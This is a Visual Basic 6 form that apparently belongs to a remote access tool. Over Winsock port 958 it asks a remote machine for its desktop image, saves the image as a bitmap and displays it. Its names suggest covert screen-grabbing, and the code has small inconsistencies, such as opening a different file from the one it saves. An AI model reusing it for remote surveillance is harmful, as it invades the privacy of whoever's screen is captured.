VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form6 
   Caption         =   "ScreenShot"
   ClientHeight    =   5895
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   7410
   Icon            =   "Form6.frx":0000
   LinkTopic       =   "Form6"
   ScaleHeight     =   5895
   ScaleWidth      =   7410
   StartUpPosition =   3  'Windows Default
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "Form6"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Const LR_LOADFROMFILE = &H10
Const IMAGE_BITMAP = 0
Const IMAGE_ICON = 1
Const IMAGE_CURSOR = 2
Const IMAGE_ENHMETAFILE = 3
Const CF_BITMAP = 2
Private Declare Function LoadImage Lib "user32" Alias "LoadImageA" (ByVal hInst As Long, ByVal lpsz As String, ByVal dwImageType As Long, ByVal dwDesiredWidth As Long, ByVal dwDesiredHeight As Long, ByVal dwFlags As Long) As Long
Private Declare Function CloseClipboard Lib "user32" () As Long
Private Declare Function OpenClipboard Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function EmptyClipboard Lib "user32" () As Long
Private Declare Function SetClipboardData Lib "user32" (ByVal wFormat As Long, ByVal hMem As Long) As Long
Private Declare Function IsClipboardFormatAvailable Lib "user32" (ByVal wFormat As Long) As Long
Private Sub Form_Load()
Winsock1.RemotePort = "958"
Winsock1.RemoteHost = Form1.Text1.Text
Winsock1.Connect
End Sub

Private Sub Winsock1_Connect()
On Error Resume Next
Open App.Path & "\Screen Captured.bmp" For Binary As #1
bGettingDesktop = True
            bFileTransfer = True
Winsock1.SendData "getdesktop"
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim Strdata As String
Dim chk1st
Dim mypos
Dim info
Dim chk1st2
Dim mypos2
Dim info2
Dim chk1st3
Dim mypos3
Dim info3

Winsock1.GetData Strdata, vbString

If InStr(1, Strdata, "|COMPLETE|") <> 0 Then
frmdownloading.objprog.Value = frmdownloading.objprog.Max
        MsgBox "Screen Captured", vbInformation, "Got Screen"
        ScreenNabbed
bFileTransfer = False
Put #1, , Strdata
Close #1
Unload frmdownloading
Set frmdownloading = Nothing
DoEvents
 If bGettingDesktop = True Then
            bGettingDesktop = False
                       ShellExecute Me.hwnd, "Open", "DESKTOP.BMP", "", "", 1
            End If
            Exit Sub
            End If
        
  If bFileTransfer = True Then
        
        If InStr(1, Strdata, "|FILESIZE|") <> 0 Then
        frmdownloading.lblBytes.Caption = CLng(Mid$(Strdata, 11, Len(Strdata)))
        frmdownloading.objprog.Max = CLng(Mid$(Strdata, 11, Len(Strdata)))
          Exit Sub
        End If
        Put #1, , Strdata
        
                With frmdownloading.objprog
            If (.Value + Len(Strdata)) <= .Max Then
                .Value = .Value + Len(Strdata)
            Else
                .Value = .Max
                DoEvents
            End If
        End With
        
    End If
End Sub
Private Sub ScreenNabbed()
Dim hDC As Long, hBitmap As Long
hBitmap = LoadImage(App.hInstance, App.Path & "\Screen Captured.bmp", IMAGE_BITMAP, Form1.Text20.Text, Form1.Text21.Text, LR_LOADFROMFILE)
If hBitmap = 0 Then
MsgBox "There was an error while loading the screenshot"
Exit Sub
End If
OpenClipboard Me.hwnd
EmptyClipboard
SetClipboardData CF_BITMAP, hBitmap
If IsClipboardFormatAvailable(CF_BITMAP) = 0 Then
MsgBox "Could not display screenshot."
End If
CloseClipboard
Me.Picture = Clipboard.GetData(vbCFBitmap)
End Sub
